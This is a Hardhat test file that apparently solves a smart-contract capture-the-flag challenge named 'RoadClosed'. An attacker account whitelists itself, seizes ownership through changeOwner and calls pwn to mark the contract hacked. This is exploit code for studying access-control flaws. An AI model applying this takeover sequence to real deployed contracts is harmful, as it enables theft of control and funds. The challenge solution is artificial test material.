const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RoadClosed", async function () {
  describe("RoadClosed - Deployment", async function () {
    let RoadClosedinstance;
    it("Should Deploy the contract as owner", async function () {
      const [Attacker, owner] = await ethers.getSigners();
      const RoadClosed = await ethers.getContractFactory("RoadClosed");
      RoadClosedinstance = await RoadClosed.connect(owner).deploy();
      await RoadClosedinstance.deployed();
      console.log("contract address", RoadClosedinstance.address);
    });

    it("Should return true if the contract deployed by owner", async function () {
      const [Attacker, owner] = await ethers.getSigners();
      let CheckingOwner = await RoadClosedinstance.connect(owner).isOwner();
      expect(CheckingOwner).equal(true);
    });

    it("Should return  isHacked false before invoking Pwn function", async function () {
      const [Attacker, owner] = await ethers.getSigners();
      let CheckingOwner = await RoadClosedinstance.connect(owner).isHacked();
      expect(CheckingOwner).equal(false);
    });

    it("invoking Whitelist functionlity for ownership by attacker", async function () {
      const [Attacker, owner] = await ethers.getSigners();
      await RoadClosedinstance.connect(Attacker).addToWhitelist(
        Attacker.address
      );
    });

    it("invoking change owner functionlity by attacker", async function () {
      const [Attacker, owner] = await ethers.getSigners();
      await RoadClosedinstance.connect(Attacker).changeOwner(Attacker.address);
      let CheckingOwner = await RoadClosedinstance.connect(Attacker).isOwner();
      expect(CheckingOwner).equal(true);
    });

    it("invoking pwn function by attacker to get Hacked", async function () {
      const [Attacker, owner] = await ethers.getSigners();
      await RoadClosedinstance.connect(Attacker)["pwn(address)"](
        Attacker.address
      );
      expect(await RoadClosedinstance.connect(Attacker).isHacked()).to.be.true;
      expect(await RoadClosedinstance.connect(Attacker).isOwner()).to.be.true;
    });
  });
});
